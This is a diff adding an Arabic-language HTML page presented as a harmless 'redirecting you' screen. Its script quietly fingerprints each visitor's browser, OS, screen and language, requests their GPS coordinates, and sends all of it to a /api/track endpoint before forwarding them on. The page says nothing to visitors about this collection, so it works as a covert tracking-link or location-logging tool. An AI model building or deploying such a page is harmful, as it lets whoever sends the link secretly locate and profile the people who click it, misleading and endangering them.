@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحويل...</title>
+    <style>
+        body {
+            font-family: 'Tajawal', Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            direction: rtl;
+        }
+        .container {
+            background-color: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            padding: 40px;
+            max-width: 500px;
+            width: 90%;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 30px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h2 {
+            color: #2c3e50;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        p {
+            color: #7f8c8d;
+            font-size: 16px;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 14px;
+            color: #95a5a6;
+        }
+        .creator {
+            position: fixed;
+            bottom: 20px;
+            width: 100%;
+            text-align: center;
+            color: #7f8c8d;
+            font-size: 14px;
+        }
+        .creator a {
+            color: #3498db;
+            text-decoration: none;
+        }
+        .creator a:hover {
+            text-decoration: underline;
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <h2>جاري تحويلك إلى الموقع المطلوب...</h2>
+        <div class="loader"></div>
+        <p>يرجى الانتظار قليلاً، سيتم تحويلك تلقائياً</p>
+        <div class="footer">نشكرك على استخدام خدمتنا</div>
+    </div>
+    
+    <div class="creator">
+        تم التطوير بواسطة <a href="#">Sami Alshamaly</a> &copy; 2023
+    </div>
+
+    <script>
+        // جمع بيانات الجهاز والمتصفح
+        function collectDeviceData() {
+            const data = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                screenResolution: `${screen.width}x${screen.height}`,
+                originalUrl: "{{ original_url }}",
+                referrer: document.referrer || "مباشر"
+            };
+
+            // استخراج نظام التشغيل والمتصفح من User Agent
+            const userAgent = navigator.userAgent;
+            let os = "غير معروف";
+            let browser = "غير معروف";
+
+            // تحديد نظام التشغيل
+            if (userAgent.indexOf("Windows") !== -1) os = "Windows";
+            else if (userAgent.indexOf("Mac") !== -1) os = "MacOS";
+            else if (userAgent.indexOf("Android") !== -1) os = "Android";
+            else if (userAgent.indexOf("iOS") !== -1) os = "iOS";
+            else if (userAgent.indexOf("Linux") !== -1) os = "Linux";
+
+            // تحديد المتصفح
+            if (userAgent.indexOf("Chrome") !== -1) browser = "Chrome";
+            else if (userAgent.indexOf("Firefox") !== -1) browser = "Firefox";
+            else if (userAgent.indexOf("Safari") !== -1) browser = "Safari";
+            else if (userAgent.indexOf("Edge") !== -1) browser = "Edge";
+            else if (userAgent.indexOf("MSIE") !== -1 || userAgent.indexOf("Trident") !== -1) browser = "Internet Explorer";
+
+            data.os = os;
+            data.browser = browser;
+            
+            // إنشاء بصمة المتصفح بسيطة
+            data.fingerprint = `${os}-${browser}-${screen.width}x${screen.height}-${navigator.language}`;
+
+            // محاولة الحصول على الموقع الجغرافي
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        data.location = `${position.coords.latitude},${position.coords.longitude}`;
+                        sendTrackingData(data);
+                    },
+                    error => {
+                        console.log("Geolocation error:", error);
+                        data.location = "غير متاح";
+                        sendTrackingData(data);
+                    },
+                    { timeout: 5000 } // 5 ثواني كحد أقصى للانتظار
+                );
+            } else {
+                data.location = "غير مدعوم";
+                sendTrackingData(data);
+            }
+        }
+
+        // إرسال البيانات إلى السيرفر
+        async function sendTrackingData(data) {
+            try {
+                console.log("إرسال البيانات:", data);
+                const response = await fetch('/api/track', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                const result = await response.json();
+                console.log("استجابة السيرفر:", result);
+                
+                // إعادة التوجيه إلى الرابط الأصلي
+                if (result.redirect) {
+                    window.location.href = result.redirect;
+                }
+            } catch (error) {
+                console.error('خطأ في إرسال بيانات التتبع:', error);
+                // إعادة التوجيه في حالة الخطأ أيضاً
+                window.location.href = "{{ original_url }}";
+            }
+        }
+
+        // بدء جمع البيانات عند تحميل الصفحة
+        window.onload = function() {
+            // تأخير قصير لضمان تحميل الصفحة بالكامل
+            setTimeout(collectDeviceData, 1000);
+        };
+    </script>
+</body>
+</html>
